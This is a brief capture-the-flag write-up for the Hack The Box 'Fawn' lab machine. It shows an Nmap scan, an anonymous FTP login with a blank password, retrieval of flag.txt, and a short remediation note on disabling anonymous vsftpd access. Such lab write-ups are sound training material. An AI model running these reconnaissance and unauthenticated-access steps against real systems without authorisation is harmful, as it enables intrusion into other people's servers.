# Hack The Box: Fawn

* **OS:** Linux
* **Difficulty:** Very Easy (Starting Point Tier 0)
* **Target Service:** FTP (Port 21)

## 1. Reconnaissance
Ran an Nmap scan to identify open ports on the target IP:
```bash
nmap -sV 10.129.248.238

Result: Port 21/tcp is open, running ftp (File Transfer Protocol).

2. Exploitation
Connected to the target using the FTP client:

ftp 10.129.248.238

Username: anonymous

Password: (Left blank)

Access was granted due to misconfigured anonymous authentication.

3. Flag Retrieval
Listed files, downloaded flag.txt to the local machine, and read the file contents

ftp> ls
ftp> get flag.txt
ftp> exit

cat flag.txt

4. Remediation
Disable anonymous FTP access in the configuration file (e.g., set anonymous_enable=NO in /etc/vsftpd.conf).

Require valid user credentials and restrict access to dedicated user directories.

